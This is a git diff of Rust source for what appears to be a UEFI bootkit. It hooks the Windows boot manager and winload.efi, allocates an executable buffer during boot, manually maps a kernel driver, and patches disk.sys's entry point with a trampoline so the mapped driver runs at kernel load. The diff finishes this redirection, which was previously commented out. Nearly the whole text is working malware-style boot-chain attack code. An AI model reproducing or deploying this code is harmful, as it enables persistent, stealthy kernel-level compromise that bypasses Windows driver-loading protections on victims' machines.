@@ -1,11 +1,13 @@
 use core::ffi::c_void;
+use core::ptr::copy_nonoverlapping;
 use core::{slice::from_raw_parts};
 use uefi::{prelude::BootServices};
 use uefi::proto::loaded_image::LoadedImage;
 use uefi::{Handle, Status};
 use crate::boot::globals::{ALLOCATED_BUFFER, DRIVER_IMAGE_SIZE};
 use crate::boot::pe::{pattern_scan, trampoline_hook64, trampoline_unhook, get_loaded_module_by_hash};
-use crate::mapper::{manually_map, get_nt_headers};
+use crate::mapper::{manually_map};
+use super::globals::JMP_SIZE;
 use super::{includes::_LOADER_PARAMETER_BLOCK};
 
 extern crate alloc;
@@ -38,7 +40,6 @@ type OslFwpKernelSetupPhase1Type = fn(loader_block: *mut _LOADER_PARAMETER_BLOCK
 #[allow(non_upper_case_globals)]
 static mut OslFwpKernelSetupPhase1: Option<OslFwpKernelSetupPhase1Type> = None;
 
-const JMP_SIZE: usize = 14;
 static mut ORIGINAL_BYTES: [u8; JMP_SIZE] = [0; JMP_SIZE];
 static mut ORIGINAL_BYTES_COPY: [u8; JMP_SIZE] = [0; JMP_SIZE];
 
@@ -59,9 +60,9 @@ pub fn setup_hooks(bootmgfw_handle: &Handle, boot_services: &BootServices) -> ue
     );
 
     // Print the bootmgfw.efi image base and of ImgArchStartBootApplication offset and image base
-    log::info!("bootmgfw.efi: {:#x}", image_base as usize);
-    log::info!("ImgArchStartBootApplication offset: {:#x}", offset);
-    log::info!("bootmgfw.efi + ImgArchStartBootApplication offset = {:#x}", (image_base as usize + offset));
+    log::info!("[+] bootmgfw.efi: {:#x}", image_base as usize);
+    log::info!("[+] ImgArchStartBootApplication offset: {:#x}", offset);
+    log::info!("[+] bootmgfw.efi + ImgArchStartBootApplication offset = {:#x}", (image_base as usize + offset));
 
     // Save the address of ImgArchStartBootApplication
     unsafe { ImgArchStartBootApplication = Some(core::mem::transmute::<_, ImgArchStartBootApplicationType>((image_base as usize + offset) as *mut u8)) }
@@ -94,9 +95,9 @@ pub fn img_arch_start_boot_application_hook(_app_entry: *mut u8, image_base: *mu
         .expect("Failed to find OslFwpKernelSetupPhase1 pattern");
 
     // Print the winload.efi image base and OslFwpKernelSetupPhase1 offset and image base
-    log::info!("winload.efi: {:#x}", image_base as usize);
-    log::info!("OslFwpKernelSetupPhase1 offset: {:#x}", offset);
-    log::info!("winload.efi + OslFwpKernelSetupPhase1 offset = {:#x}", (image_base as usize + offset));
+    log::info!("[+] winload.efi: {:#x}", image_base as usize);
+    log::info!("[+] OslFwpKernelSetupPhase1 offset: {:#x}", offset);
+    log::info!("[+] winload.efi + OslFwpKernelSetupPhase1 offset = {:#x}", (image_base as usize + offset));
 
     // Save the address of OslFwpKernelSetupPhase1
     unsafe { OslFwpKernelSetupPhase1 = Some(core::mem::transmute::<_, OslFwpKernelSetupPhase1Type>((image_base as usize + offset) as *mut u8)) }
@@ -137,8 +138,6 @@ fn bl_img_allocate_image_buffer_hook(image_buffer: *mut *mut c_void, image_size:
     // Unhook BlImgAllocateImageBuffer and restore stolen bytes before we do anything else
     unsafe { trampoline_unhook(BlImgAllocateImageBuffer.unwrap() as *mut () as *mut u8,ORIGINAL_BYTES_COPY.as_mut_ptr(),JMP_SIZE) };
 
-    log::info!("[+] BlImgAllocateImageBuffer Hook called!");
-
     // Call the original unhooked BlImgAllocateImageBuffer function
     let status = unsafe { BlImgAllocateImageBuffer.unwrap()(image_buffer, image_size, memory_type, preffered_attributes, preferred_alignment, flags) };
 
@@ -146,8 +145,8 @@ fn bl_img_allocate_image_buffer_hook(image_buffer: *mut *mut c_void, image_size:
         // Allocate memory for the driver
         let status = unsafe { BlImgAllocateImageBuffer.unwrap()(&mut ALLOCATED_BUFFER as *mut *mut c_void, DRIVER_IMAGE_SIZE, memory_type, BL_MEMORY_ATTRIBUTE_RWX, preferred_alignment, 0) };
         
-        log::info!("Second BlImgAllocateImageBuffer returned: {:?}!", status);
-        log::info!("Driver Address: {:#x}", unsafe { ALLOCATED_BUFFER as u64 });
+        log::info!("[+] BlImgAllocateImageBuffer returned: {:?}!", status);
+        log::info!("[+] Allocated Buffer: {:#x}", unsafe { ALLOCATED_BUFFER as u64 });
 
         // This time we don't hook BlImgAllocateImageBuffer again
         return status;
@@ -171,34 +170,42 @@ fn ols_fwp_kernel_setup_phase1_hook(loader_block: *mut _LOADER_PARAMETER_BLOCK) 
 
     // ntoskrnl.exe hash: 0xa3ad0390
     // Get ntoskrnl.exe _LIST_ENTRY from the _LOADER_PARAMETER_BLOCK to get image base and image size 
-    let ntoskrnl_entry = unsafe { get_loaded_module_by_hash(&mut (*loader_block).LoadOrderListHead,0xa3ad0390)
+    let ntoskrnl_module = unsafe { get_loaded_module_by_hash(&mut (*loader_block).LoadOrderListHead,0xa3ad0390)
         .expect("Failed to get ntoskrnl by hash")
     };
 
-    log::info!("ntoskrnl.exe image base: {:p}", unsafe { (*ntoskrnl_entry).DllBase });
-    log::info!("ntoskrnl.exe image size: {:#x}", unsafe { (*ntoskrnl_entry).SizeOfImage });
+    log::info!("ntoskrnl.exe image base: {:p}", unsafe { (*ntoskrnl_module).DllBase });
+    log::info!("ntoskrnl.exe image size: {:#x}", unsafe { (*ntoskrnl_module).SizeOfImage });
 
     // The target module is the driver we are going to hook, this will be left to the user to change
-    // disk.sys hash: 0xf78f291d
-    let target_driver_ldr_data = unsafe { get_loaded_module_by_hash(&mut (*loader_block).LoadOrderListHead, 0xf78f291d)
+    
+    // Disk.sys hash: 0xf78f291d
+    let target_module = unsafe { get_loaded_module_by_hash(&mut (*loader_block).LoadOrderListHead, 0xf78f291d)
         .expect("Failed to get target driver by hash")
     };
 
-    let nt_headers = unsafe { get_nt_headers((*target_driver_ldr_data).DllBase as _).expect("Failed to get target driver nt headers") };
-    let _target_entry_point = unsafe { (*target_driver_ldr_data).DllBase as usize + (*nt_headers).OptionalHeader.AddressOfEntryPoint as usize };
+    log::info!("[+] disk.sys image base: {:p}", unsafe { (*target_module).DllBase });
+    log::info!("[+] disk.sys image size: {:#x}", unsafe { (*target_module).SizeOfImage });
 
-    let _driver_entry = unsafe { manually_map((*ntoskrnl_entry).DllBase as _)
+    let mapped_driver_address_of_entry_point = unsafe { manually_map((*ntoskrnl_module).DllBase as _, (*target_module).EntryPoint as _)
         .expect("Failed to manually map Windows kernel driver")
     };
 
-    /* Gotta fix this (redirect to the driver entry point)
-    unsafe { ORIGINAL_BYTES = trampoline_hook64(target_entry_point as _, driver_entry, JMP_SIZE)
-        .expect("Failed to perform trampoline hook on OslArchTransferToKernel")
+    // lea r8, [rip - 7]
+    let asm_bytes: [u8; 7] = [0x4C, 0x8D, 0x05, 0xF9, 0xFF, 0xFF, 0xFF]; // 7 bytes
+    unsafe { copy_nonoverlapping(asm_bytes.as_ptr(), (*target_module).EntryPoint as _, asm_bytes.len()) };
+
+    // Trampoline hook target driver + 7 bytes and redirect to our manually mapped driver
+    unsafe { ORIGINAL_BYTES = trampoline_hook64(((*target_module).EntryPoint as *mut u8).add(7), mapped_driver_address_of_entry_point, JMP_SIZE)
+        .expect("Failed to perform trampoline hook on Disk.sys")
     };
-    */
+
+    log::info!("[+] Manually Mapped Driver Entry: {:#p}", mapped_driver_address_of_entry_point);
+    log::info!("[+] Disk.sys DriverEntry: {:p}", unsafe { (*target_module).EntryPoint });
+    log::info!("[+] Stolen Bytes Address: {:#p}", unsafe { ORIGINAL_BYTES.as_mut_ptr() });
 
     log::info!("[+] Loading Windows Kernel...");
-    
+
     /* The commented code is not required, if you're hooking OslFwpKernelSetupPhase1
     
     // Look for the OslArchTransferToKernel signature in Windows OS Loader (winload.efi) and return an offset
